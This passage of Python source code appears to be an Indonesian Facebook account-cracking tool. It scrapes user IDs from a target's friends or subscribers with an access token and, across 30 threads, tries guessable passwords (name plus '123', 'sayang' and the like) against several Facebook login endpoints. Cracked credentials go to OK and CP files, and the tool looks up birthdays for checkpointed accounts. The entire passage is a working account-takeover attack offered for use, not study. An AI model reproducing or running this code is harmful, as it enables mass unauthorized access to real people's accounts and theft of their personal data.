			totalok = open("%sOK/%s"%(H,file)).read().splitlines()
		except IOError:
			exit(" %s[%s!%s] %sfile %s tidak tersedia"%(O,H,O,N,file))
		print('%sÏ€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€'%(O))
		os.system("%scat OK/%s"%(H,file))
		print('%sÏ€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€'%(O))
		input(" %s[%s*%s] %stekan enter untuk kembali ke menu"%(O,H,O,N))
		menu()
	elif anjg == "2":
		dirs = os.listdir("CP")
		print('%sÏ€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€'%(O))
		for file in dirs:
			print(" %s[%s*%s] %s> %s"%(O,H,O,N,file))
		try:
			print('%sÏ€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€'%(O))
			file = input(" %s[%s?%s] %sfile :%s "%(O,H,O,N,H))
			if file == "":
				menu()
			totalcp = open("%sCP/%s"%(K,file)).read().splitlines()
		except IOError:
			exit(" %s[%s!%s] %sfile %s tidak tersedia"%(O,H,O,N,file))
		print('%sÏ€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€'%(O))
		os.system("%scat CP/%s"%(K,file))
		print('%sÏ€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€'%(O))
		input(" %s[%s*%s] %stekan enter untuk kembali ke menu "%(O,H,O,N))
		menu()
	else:
		menu()
		
#follwr
def follow():
	try:
		token = open("token.txt","r").read()
	except IOError:
		jalan(" Token Kadaluarsa")
		time.sleep(0.5)
		login()
	uid = input(" Masukkan ID Target : ")
	try:
		jumlah = int(input(" Mau Ambil Berapa ID : "))
		if jumlah>5000:
			jalan(" Maksimal 5000 ID")
			time.sleep(0.5)
			follow()
	except ValueError:
		jalan(" Input Invalid")
		time.sleep(0.5)
		follow()
	#try:
		#asu = requests.get("https://graph.facebook.com/"+uid+"?access_token="+token)
		#tulul = json.loads(asu.text)
		#print(" Nama : "+tulul["name"])
	#except KeyError:
		#print(" ID Salah")
		#time.sleep(0.5)
		#follow()
	#except requests.exceptions.ConnectionError:
		#jalan(" Tidak Ada Internet")
		#time.sleep(0.5)
		#exit()
	try:
		bulu = requests.get("https://graph.facebook.com/"+uid+"/subscribers?limit="+str(jumlah)+"&access_token="+token)
		buriq = json.loads(bulu.text)
		for cew in buriq["data"]:
			try:
				sange = cew["id"]
				bule = cew["name"]
				id.append(sange+"|"+bule)
			except:
				continue
		print(" Total ID : %s"%(len(id)))
		atursandi()
	except requests.exceptions.ConnectionError:
		jalan(" Tidak Ada Internet")
		time.sleep(0.5)
		exit()

### DUMP PUBLIK ###
def publik():
	try:
		token=open("token.txt","r").read()
	except IOError:
		exit(" %s[!] token kadaluwarsa"%(M))
	idt=input("\n %s[%s?%s] %smasukkan id :%s "%(O,H,O,N,O))
	if idt in[""]:
		menu()
	print('%sÏ€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€'%(O))
	print(" %s[%s1%s] %scrack all id   %s[%s2%s] %scrack id old"%(O,H,O,N,O,H,O,N))
	ask=input(" %s[%s?%s] %spilih :%s "%(O,H,O,N,H))
	if ask in[""]:
		menu()
	elif ask in["1"]:
		try:
			for i in requests.get("https://graph.facebook.com/%s/friends?access_token=%s"%(idt, token)).json()["data"]:
				uid = i["id"]
				nama = i["name"]
				id.append(uid+"<=>"+nama)
		except KeyError:
			exit(" %s[%s!%s] %sakun tidak tersedia atau list teman private"%(O,H,O,K))
		print(" %s[%s+%s] %stotal id :%s %s"%(O,H,O,N,H,len(id)))
		atursandi()
	elif ask in["2"]:
		try:
			for i in requests.get("https://graph.facebook.com/%s/friends?access_token=%s"%(idt, token)).json()["data"]:
				uid = i["id"]
				nama = i["name"]
				if len(i['id'])==6 or len(i['id'])==7 or len(i['id'])==8 or len(i['id'])==9 or len(i['id'])==10:
					id.append(uid+"<=>"+nama)
				elif i['id'][:10] in ['1000000000']:
					id.append(uid+"<=>"+nama)
				elif i['id'][:9] in ['100000000']:
					id.append(uid+"<=>"+nama)
				elif i['id'][:8] in ['10000000']:
					id.append(uid+"<=>"+nama)
				elif i['id'][:7] in ['1000000','1000001','1000002','1000003','1000004','1000005']:
					id.append(uid+"<=>"+nama)
		except KeyError:
			exit(" %s[%s!%s] %sakun tidak tersedia atau list teman private"%(O,H,O,K))
		print(" %s[%s+%s] %stotal id :%s %s"%(O,H,O,N,H,len(id)))
		atursandi()
		
### ATUR SANDI ###
def atursandi():
	print('%sÏ€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€'%(O))
	print(" %s[%s1%s] %sotomatis  %s[%s2%s] %smanual  %s[%s3%s] %sgabungkan"%(O,H,O,N,O,K,O,N,O,U,O,N))
	ask=input(" %s[%s?%s] %spilih :%s "%(O,H,O,N,H))
	if ask in[""]:
		menu()
	elif ask in["1"]:
		otomatis()
	elif ask in["2"]:
		manual()
	elif ask in["3"]:
		gabungkan()
	else:
		exit()

def munculopsi():
	print('%sÏ€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€'%(O))
	print(" %s[%s1%s] %smunculkan opsi  %s[%s2%s] %sjangan munculkan"%(O,H,O,N,O,K,O,N))
	ask=input(" %s[%s?%s] %spilih :%s "%(O,H,O,N,H))
	if ask in[""]:
		menu()
	elif ask in["1"]:
		opsi.append("y")
	elif ask in["2"]:
		opsi.append("t")
	else:
		exit()

### OTOMATIS ###
def otomatis():
	munculopsi()
	print('%sÏ€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€'%(O))
	print(" %s[%s1%s]. %smetode API [%sfast%s]"%(O,H,O,N,O,N))
	print(" %s[%s2%s]. %smetode mbasic [%sslow%s]"%(O,H,O,N,U,N))
	print(" %s[%s3%s]. %smetode mobile [%svery slow%s]"%(O,H,O,N,K,N))
	print(" %s[%s4%s]. %smetode graph [%ssuper slow hef%s]"%(O,H,O,N,H,N))
	print('%sÏ€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€'%(O))
	ask=input(" %s[%s?%s] %spilih :%s "%(O,H,O,N,H))
	if ask=="":
		exit(" %s[!] isi jawaban dengan benar!"%(M))
	elif ask=="1":
		print(' %s[%s+%s] %shasil %sOK %sdisimpan ke -> %sok.txt'%(O,H,O,N,H,N,H))
		print(' %s[%s+%s] %shasil %sCP %sdisimpan ke -> %scp.txt'%(O,K,O,N,K,N,K))
		print('%sÏ€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€'%(O))
		with ThreadPoolExecutor(max_workers=30) as fall:
			for user in id:
				uid, name = user.split("<=>")
				nam = name.split(' ')
				if len(name) == 3 or len(name) == 4 or len(name) == 5:
					pwx = [name, nam[0]+"123", nam[0]+"1234", nam[0]+"12345", "sayang", "kontol", "anjing"]
				else:
					pwx = [name, nam[0]+"123", nam[0]+"1234", nam[0]+"12345", "sayang", "kontol", "anjing"]
				fall.submit(api, uid, pwx)
		exit("\n\n [#] crack selesai...")
	elif ask=="2":
		print(' %s[%s+%s] %shasil %sOK %sdisimpan ke -> %sok.txt'%(O,H,O,N,H,N,H))
		print(' %s[%s+%s] %shasil %sCP %sdisimpan ke -> %scp.txt'%(O,K,O,N,K,N,K))
		print('%sÏ€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€'%(O))
		with ThreadPoolExecutor(max_workers=30) as fall:
			for user in id:
				uid, name = user.split("<=>")
				nam = name.split(' ')
				if len(name) == 3 or len(name) == 4 or len(name) == 5:
					pwx = [name, nam[0]+"123", nam[0]+"1234", nam[0]+"12345", "sayang", "kontol", "anjing"]
				else:
					pwx = [name, nam[0]+"123", nam[0]+"1234", nam[0]+"12345", "sayang", "kontol", "anjing"]
				fall.submit(crack, uid, pwx,"https://mbasic.facebook.com")
		exit("\n\n [#] crack selesai...")
	elif ask=="3":
		print(' %s[%s+%s] %shasil %sOK %sdisimpan ke -> %sok.txt'%(O,H,O,N,H,N,H))
		print(' %s[%s+%s] %shasil %sCP %sdisimpan ke -> %scp.txt'%(O,K,O,N,K,N,K))
		print('%sÏ€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€'%(O))
		with ThreadPoolExecutor(max_workers=30) as fall:
			for user in id:
				uid, name = user.split("<=>")
				nam = name.split(' ')
				if len(name) == 3 or len(name) == 4 or len(name) == 5:
					pwx = [name, nam[0]+"123", nam[0]+"1234", nam[0]+"12345", "sayang", "kontol", "anjing"]
				else:
					pwx = [name, nam[0]+"123", nam[0]+"1234", nam[0]+"12345", "sayang", "kontol", "anjing"]
				fall.submit(crack, uid, pwx,"https://m.facebook.com")
		exit("\n\n [#] crack selesai...")
	elif ask=="4":
		print(' %s[%s+%s] %shasil %sOK %sdisimpan ke -> %sok.txt'%(O,H,O,N,H,N,H))
		print(' %s[%s+%s] %shasil %sCP %sdisimpan ke -> %scp.txt'%(O,K,O,N,K,N,K))
		print('%sÏ€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€'%(O))
		with ThreadPoolExecutor(max_workers=30) as fall:
			for user in id:
				uid, name = user.split("<=>")
				nam = name.split(' ')
				if len(name) == 3 or len(name) == 4 or len(name) == 5:
					pwx = [name, nam[0]+"123", nam[0]+"1234", nam[0]+"12345", "sayang", "kontol", "anjing"]
				else:
					pwx = [name, nam[0]+"123", nam[0]+"1234", nam[0]+"12345", "sayang", "kontol", "anjing"]
				fall.submit(crack, uid, pwx,"https://graph.facebook.com")
		exit("\n\n [#] crack selesai...")
		
### MANUAL ###
def manual():
	munculopsi()
	print('%sÏ€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€'%(O))
	print(" %s[%s!%s] %sgunakan , (%skoma%s) sebagai pemisah"%(O,H,O,N,O,N))
	pwek=input(' %s[%s?%s] %sbuat kata sandi :%s '%(O,H,O,N,H))
	if pwek=="":
		exit(" %s[!] isi jawaban dengan benar!"%(M))
	elif len(pwek)<=5:
		exit(" %s[!] masukan sandi minimal 6 angka!"%(M))
	print('%sÏ€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€'%(O))
	print(" %s[%s1%s]. %smetode API [%sfast%s]"%(O,H,O,N,O,N))
	print(" %s[%s2%s]. %smetode mbasic [%sslow%s]"%(O,H,O,N,U,N))
	print(" %s[%s3%s]. %smetode mobile [%svery slow%s]"%(O,H,O,N,K,N))
	print(" %s[%s4%s]. %smetode graph [%ssuper slow hef%s]"%(O,H,O,N,H,N))
	print('%sÏ€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€'%(O))
	ask=input(" %s[%s?%s] %spilih :%s "%(O,H,O,N,H))
	if ask=="":
		exit(" %s[!] isi jawaban dengan benar!"%(M))
	elif ask=="1":
		print(' %s[%s+%s] %shasil %sOK %sdisimpan ke -> %sok.txt'%(O,H,O,N,H,N,H))
		print(' %s[%s+%s] %shasil %sCP %sdisimpan ke -> %scp.txt'%(O,K,O,N,K,N,K))
		print('%sÏ€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€'%(O))
		with ThreadPoolExecutor(max_workers=30) as fall:
			for user in id:
				uid, name = user.split("<=>")
				fall.submit(api, uid, pwek.split(","))
		exit("\n\n [#] crack selesai...")
	elif ask=="2":
		print(' %s[%s+%s] %shasil %sOK %sdisimpan ke -> %sok.txt'%(O,H,O,N,H,N,H))
		print(' %s[%s+%s] %shasil %sCP %sdisimpan ke -> %scp.txt'%(O,K,O,N,K,N,K))
		print('%sÏ€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€'%(O))
		with ThreadPoolExecutor(max_workers=30) as fall:
			for user in id:
				uid, name = user.split("<=>")
				fall.submit(crack, uid, pwek.split(","),"https://mbasic.facebook.com")
		exit("\n\n [#] crack selesai...")
	elif ask=="3":
		print(' %s[%s+%s] %shasil %sOK %sdisimpan ke -> %sok.txt'%(O,H,O,N,H,N,H))
		print(' %s[%s+%s] %shasil %sCP %sdisimpan ke -> %scp.txt'%(O,K,O,N,K,N,K))
		print('%sÏ€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€'%(O))
		with ThreadPoolExecutor(max_workers=30) as fall:
			for user in id:
				uid, name = user.split("<=>")
				fall.submit(crack, uid, pwek.split(","),"https://m.facebook.com")
		exit("\n\n [#] crack selesai...")
	elif ask=="4":
		print(' %s[%s+%s] %shasil %sOK %sdisimpan ke -> %sok.txt'%(O,H,O,N,H,N,H))
		print(' %s[%s+%s] %shasil %sCP %sdisimpan ke -> %scp.txt'%(O,K,O,N,K,N,K))
		print('%sÏ€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€'%(O))
		with ThreadPoolExecutor(max_workers=30) as fall:
			for user in id:
				uid, name = user.split("<=>")
				nam = name.split(' ')
				if len(name) == 3 or len(name) == 4 or len(name) == 5:
					pwx = [name, nam[0]+"123", nam[0]+"1234", nam[0]+"12345", "sayang", "kontol", "anjing"]
				else:
					pwx = [name, nam[0]+"123", nam[0]+"1234", nam[0]+"12345", "sayang", "kontol", "anjing"]
				fall.submit(crack, uid, pwx,"https://graph.facebook.com")
		exit("\n\n [#] crack selesai...")
### GABUNGAN ###
def gabungkan():
	munculopsi()
	print('%sÏ€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€'%(O))
	print(" %s[%s!%s] %ssandi bawaan %snama123,1234,12345,sayang,kontol,anjing"%(O,H,O,N,H))
	print(" %s[%s!%s] %sgunakan , (%skoma%s) sebagai pemisah"%(O,H,O,N,O,N))
	pwek=input(' %s[%s?%s] %ssandi gabungan :%s '%(O,H,O,N,H))
	if pwek=="":
		exit(" %s[!] isi jawaban dengan benar!"%(M))
	elif len(pwek)<=5:
		exit(" %s[!] masukan sandi minimal 6 angka!"%(M))
	print('%sÏ€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€'%(O))
	print(" %s[%s1%s]. %smetode API [%sfast%s]"%(O,H,O,N,O,N))
	print(" %s[%s2%s]. %smetode mbasic [%sslow%s]"%(O,H,O,N,U,N))
	print(" %s[%s3%s]. %smetode mobile [%svery slow%s]"%(O,H,O,N,K,N))
	print(" %s[%s4%s]. %smetode graph [%ssuper slow hef%s]"%(O,H,O,N,H,N))
	print('%sÏ€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€'%(O))
	ask=input(" %s[%s?%s] %spilih :%s "%(O,H,O,N,H))
	if ask=="":
		exit(" %s[!] isi jawaban dengan benar!"%(M))
	elif ask=="1":
		print(' %s[%s+%s] %shasil %sOK %sdisimpan ke -> %sok.txt'%(O,H,O,N,H,N,H))
		print(' %s[%s+%s] %shasil %sCP %sdisimpan ke -> %scp.txt'%(O,K,O,N,K,N,K))
		print('%sÏ€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€'%(O))
		with ThreadPoolExecutor(max_workers=30) as fall:
			for user in id:
				uid, name = user.split("<=>")
				nam = name.split(' ')
				if len(name) == 3 or len(name) == 4 or len(name) == 5:
					pwx = [name, nam[0]+"123", nam[0]+"1234", nam[0]+"12345", "sayang", "kontol", "anjing",pwek.split(",")]
				else:
					pwx = [name, nam[0]+"123", nam[0]+"1234", nam[0]+"12345", "sayang", "kontol", "anjing",pwek.split(",")]
				fall.submit(api, uid, pwx)
		exit("\n\n [#] crack selesai...")
	elif ask=="2":
		print(' %s[%s+%s] %shasil %sOK %sdisimpan ke -> %sok.txt'%(O,H,O,N,H,N,H))
		print(' %s[%s+%s] %shasil %sCP %sdisimpan ke -> %scp.txt'%(O,K,O,N,K,N,K))
		print('%sÏ€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€'%(O))
		with ThreadPoolExecutor(max_workers=30) as fall:
			for user in id:
				uid, name = user.split("<=>")
				nam = name.split(' ')
				if len(name) == 3 or len(name) == 4 or len(name) == 5:
					pwx = [name, nam[0]+"123", nam[0]+"1234", nam[0]+"12345", "sayang", "kontol", "anjing",pwek.split(",")]
				else:
					pwx = [name, nam[0]+"123", nam[0]+"1234", nam[0]+"12345", "sayang", "kontol", "anjing",pwek.split(",")]
				fall.submit(crack, uid, pwx,"https://mbasic.facebook.com")
		exit("\n\n [#] crack selesai...")
	elif ask=="3":
		print(' %s[%s+%s] %shasil %sOK %sdisimpan ke -> %sok.txt'%(O,H,O,N,H,N,H))
		print(' %s[%s+%s] %shasil %sCP %sdisimpan ke -> %scp.txt'%(O,K,O,N,K,N,K))
		print('%sÏ€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€'%(O))
		with ThreadPoolExecutor(max_workers=30) as fall:
			for user in id:
				uid, name = user.split("<=>")
				nam = name.split(' ')
				if len(name) == 3 or len(name) == 4 or len(name) == 5:
					pwx = [name, nam[0]+"123", nam[0]+"1234", nam[0]+"12345", "sayang", "kontol", "anjing",pwek.split(",")]
				else:
					pwx = [name, nam[0]+"123", nam[0]+"1234", nam[0]+"12345", "sayang", "kontol", "anjing",pwek.split(",")]
				fall.submit(crack, uid, pwx,"https://m.facebook.com")
		exit("\n\n [#] crack selesai...")
	elif ask=="4":
		print(' %s[%s+%s] %shasil %sOK %sdisimpan ke -> %sok.txt'%(O,H,O,N,H,N,H))
		print(' %s[%s+%s] %shasil %sCP %sdisimpan ke -> %scp.txt'%(O,K,O,N,K,N,K))
		print('%sÏ€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€Ï€'%(O))
		with ThreadPoolExecutor(max_workers=30) as fall:
			for user in id:
				uid, name = user.split("<=>")
				nam = name.split(' ')
				if len(name) == 3 or len(name) == 4 or len(name) == 5:
					pwx = [name, nam[0]+"123", nam[0]+"1234", nam[0]+"12345", "sayang", "kontol", "anjing"]
				else:
					pwx = [name, nam[0]+"123", nam[0]+"1234", nam[0]+"12345", "sayang", "kontol", "anjing"]
				fall.submit(crack, uid, pwx,"https://graph.facebook.com")
		exit("\n\n [#] crack selesai...")
###Crack X
def graph(uid, pwx):
	try:
		ua = open("ugent.txt", "r").read()
	except IOError:
		ua = ("Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.81 Safari/537.36")
	global ok, cp, loop, token
	sys.stdout.write(
		"\r %s[*] [crack] %s/%s OK:-%s - CP:-%s "%(N,loop, len(id), len(ok), len(cp))
	); sys.stdout.flush()
	for pw in pwx:
		pw = pw.lower()
		headers_ = {"x-fb-connection-bandwidth": str(random.randint(20000000.0, 30000000.0)), "x-fb-sim-hni": str(random.randint(20000, 40000)), "x-fb-net-hni": str(random.randint(20000, 40000)), "x-fb-connection-quality": "EXCELLENT", "x-fb-connection-type": "cell.CTRadioAccessTechnologyHSDPA", "user-agent": ua, "content-type": "application/x-www-form-urlencoded", "x-fb-http-engine": "Liger"}
		send = ses.get("https://graph.facebook.com/auth/login?format=json&email="+str(uid)+"&password="+str(pw)+"&credentials_type=device_based_login_password&generate_session_cookies=1&error_detail_type=button_with_disabled&source=device_based_login&meta_inf_fbmeta=%20&currently_logged_in_userid=0&method=GET&locale=en_US&client_country_code=US&fb_api_caller_class=com.facebook.fos.headersv2.fb4aorca.HeadersV2ConfigFetchRequestHandler&access_token=350685531728|62f8ce9f74b12f84c123cc23437a4a32&fb_api_req_friendly_name=authenticate&cpl=true", headers=headers_)
		if "session_key" in send.text and "EAAA" in send.text:
			print("\r %s[OK] %s|%s|%s"%(H,uid, pw, send.json()["access_token"]))
			ok.append("%s|%s"%(uid, pw))
			open("OK/%s.txt"%(tanggal),"a").write(" [OK] %s|%s\n"%(uid, pw))
			break
		elif "www.facebook.com" in send.json()["error_msg"]:
			if "y" in opsi:
				try:
					token = open("token.txt", "r").read()
					ttl = ses.get("https://graph.facebook.com/%s?access_token=%s"%(uid, token)).json()["birthday"]
					month, day, year = ttl.split("/")
					month = bulan[month]
					print("\r %s[CP] %s|%s|%s %s %s"%(K,uid, pw, day, month, year))
					cp.append("%s|%s"%(uid, pw))
					open("CP/%s.txt"%(tanggal),"a").write(" [CP] %s|%s|%s %s %s\n"%(uid, pw, day, month, year))
					break
				except (KeyError, IOError):
					day = (" ")
					month = (" ")
					year = (" ")
				except:pass
				ceker(uid,pw,ua)
				cp.append("%s|%s"%(uid, pw))
				open("CP/%s.txt"%(tanggal),"a").write(" [CP] %s|%s\n"%(uid, pw))
				break
			elif "t" in opsi:
				try:
					token = open("token.txt", "r").read()
					ttl = ses.get("https://graph.facebook.com/%s?access_token=%s"%(uid, token)).json()["birthday"]
					month, day, year = ttl.split("/")
					month = bulan[month]
					print("\r %s[CP] %s|%s|%s %s %s"%(K,uid, pw, day, month, year))
					cp.append("%s|%s"%(uid, pw))
